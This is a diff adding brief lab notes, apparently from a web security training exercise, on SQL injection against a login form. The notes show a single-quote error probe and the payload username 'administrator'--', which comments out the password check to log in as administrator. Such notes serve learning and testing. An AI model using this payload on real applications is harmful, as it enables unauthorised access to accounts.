@@ -1,0 +1,12 @@
+SQL injection - Login functionality
+
+End Goal:  perform a SQL injection attack that logs in to the application as the administrator user.
+
+Analysis:
+______________
+SELECT  firstname FROM users where username='admin' and password='admin'
+
+SELECT  firstname FROM users where username=''' and password='admin' > internal server error.
+
+SELECT  firstname FROM users where username='administrator'--' and password='admin' > It will ignore passwords because of sql char in the username.
+
